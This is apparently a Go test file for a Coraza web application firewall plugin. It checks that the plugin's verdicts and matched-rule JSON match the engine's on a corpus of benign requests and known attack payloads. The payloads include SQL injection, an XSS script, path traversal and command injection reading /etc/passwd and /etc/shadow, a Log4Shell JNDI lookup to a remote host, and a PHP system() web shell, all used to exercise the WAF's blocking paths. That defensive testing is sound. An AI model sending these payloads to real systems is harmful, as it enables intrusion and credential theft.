package main

import (
	"encoding/json"
	"strconv"
	"testing"
	"unsafe"

	"github.com/corazawaf/coraza/v3/types"
)

// equivalenceCorpus mixes benign traffic with payloads that CRS scores or
// blocks, so every buildResult path (allow, anomaly block, interruption) runs.
var equivalenceCorpus = []benchRequest{
	benignRequest,
	{method: "GET", path: "/index.html", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}, {"Accept", "text/html"}}},
	{method: "POST", path: "/api/v1/items", headers: [][2]string{{"Host", "example"}, {"User-Agent", "curl/8.0"}, {"Content-Type", "application/json"}}},
	{method: "GET", path: "/search", query: "id=1'+OR+1=1+--", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}}},
	{method: "GET", path: "/q", query: "q=%3Cscript%3Ealert(1)%3C/script%3E", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}}},
	{method: "GET", path: "/download", query: "file=../../../../etc/passwd", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}}},
	{method: "GET", path: "/x.git/info/refs", headers: [][2]string{{"Host", "example"}, {"User-Agent", "git/2.43"}}},
	{method: "GET", path: "/run", query: "cmd=;cat+/etc/shadow", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}}},
	{method: "GET", path: "/", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Nikto/2.5.0"}}},
	{method: "GET", path: "/", headers: [][2]string{{"Host", "example"}, {"User-Agent", "${jndi:ldap://x.example/a}"}}},
	{method: "GET", path: "/p.php", query: "x=<?php+system($_GET['c']);+?>", headers: [][2]string{{"Host", "example"}, {"User-Agent", "Mozilla/5.0"}}},
	{method: "GET", path: "/", headers: [][2]string{{"User-Agent", "Mozilla/5.0"}}},
	{method: "TRACE", path: "/", headers: [][2]string{{"Host", "127.0.0.1"}}},
}

// legacyMatchedRulesJSON is the encoding/json implementation the hand encoder
// replaced; the FFI payload must stay byte-identical to it.
func legacyMatchedRulesJSON(matchedRules []types.MatchedRule) string {
	type hit struct {
		I int `json:"i"`
		S int `json:"s"`
	}
	var hits []hit
	for _, mr := range matchedRules {
		if id := mr.Rule().ID(); id > 0 {
			hits = append(hits, hit{I: id, S: int(mr.Rule().Severity())})
		}
	}
	if len(hits) == 0 {
		return ""
	}
	encoded, err := json.Marshal(hits)
	if err != nil {
		panic(err)
	}
	return string(encoded)
}

type engineVerdict struct {
	matched      []types.MatchedRule
	interruption *types.Interruption
}

func evalEngine(t *testing.T, handle uint64, r benchRequest, id string) engineVerdict {
	inst, err := getWAF(handle)
	if err != nil {
		t.Fatal(err)
	}
	tx := inst.waf.NewTransactionWithID(id)
	defer func() {
		tx.ProcessLogging()
		_ = tx.Close()
	}()
	tx.ProcessConnection("127.0.0.1", 40000, "127.0.0.1", 8080)
	uri := r.path
	if r.query != "" {
		uri += "?" + r.query
	}
	tx.ProcessURI(uri, r.method, "HTTP/1.1")
	for _, h := range r.headers {
		tx.AddRequestHeader(h[0], h[1])
	}
	it := tx.ProcessRequestHeaders()
	if it == nil {
		if it, err = tx.ProcessRequestBody(); err != nil {
			t.Fatal(err)
		}
	}
	return engineVerdict{matched: tx.MatchedRules(), interruption: it}
}

func goString(p *_Ctype_char) string {
	if p == nil {
		return ""
	}
	n := 0
	for *(*byte)(unsafe.Add(unsafe.Pointer(p), n)) != 0 {
		n++
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), n))
}

// TestPluginVerdictsMatchEngine runs each corpus request through Coraza
// directly and through the exported FFI entry point, and requires the same
// verdict, the same rule hits, and a byte-identical matched-rules payload.
// DetectionOnly covers the anomaly-rule verdict that Coraza does not interrupt.
func TestPluginVerdictsMatchEngine(t *testing.T) {
	for name, directives := range map[string]string{
		"engine on":      chartDefaultDirectives,
		"detection only": chartDefaultDirectives + "SecRuleEngine DetectionOnly\n",
	} {
		t.Run(name, func(t *testing.T) {
			handle, _, err := createWAF(directives, "", "", 0, 0, 0, false, matchedDataNone, 128)
			if err != nil {
				t.Fatal(err)
			}
			defer destroyWAF(handle)
			assertPluginMatchesEngine(t, handle)
		})
	}
}

func assertPluginMatchesEngine(t *testing.T, handle uint64) {
	blocked := 0
	for i, r := range equivalenceCorpus {
		name := r.method + " " + r.path + "?" + r.query
		want := evalEngine(t, handle, r, "engine-"+strconv.Itoa(i))
		reference := legacyMatchedRulesJSON(want.matched)
		if got := string(appendMatchedRulesJSON(nil, want.matched)); got != reference {
			t.Errorf("%s: encoder output %q, encoding/json %q", name, got, reference)
		}

		idBuf := cstr("plugin-" + strconv.Itoa(i))
		cr := newCRequest(r)
		res := coraza_process_request(
			_Ctype_uint64_t(handle), cptr(idBuf),
			cptr(cr.srcIP), 40000, cptr(cr.dstIP), 8080,
			cptr(cr.method), cptr(cr.path), cptr(cr.query), cptr(cr.version),
			cptr(cr.headers), _Ctype_int(len(cr.headers)),
			nil, 0, 0, 1024, 0, 0, 128,
		)
		matchedRules := goString(res.matched_rules)
		action, status, ruleID := goString(res.action), int(res.status), int(res.rule_id)
		coraza_free_string(res.data)
		coraza_free_string(res.matched_rules)
		coraza_free_string(res.matched_var)

		if matchedRules != reference {
			t.Errorf("%s: plugin matched_rules %q, engine %q", name, matchedRules, reference)
		}
		if int(res.rules_hit) != len(want.matched) {
			t.Errorf("%s: plugin rules_hit %d, engine %d", name, res.rules_hit, len(want.matched))
		}
		wantRule := 0
		if want.interruption != nil {
			wantRule = want.interruption.RuleID
		} else {
			for _, mr := range want.matched {
				switch id := mr.Rule().ID(); id {
				case 949110, 949111, 959100, 959101:
					wantRule = id
				}
			}
		}
		wantDeny := wantRule != 0
		if gotDeny := action != "allow" || status != 0; gotDeny != wantDeny || ruleID != wantRule {
			t.Errorf("%s: plugin action=%s status=%d rule=%d, engine deny=%v rule=%d",
				name, action, status, ruleID, wantDeny, wantRule)
		}
		if wantDeny {
			blocked++
		}
	}
	if blocked == 0 {
		t.Fatal("corpus produced no blocked request; it no longer exercises the deny paths")
	}
}
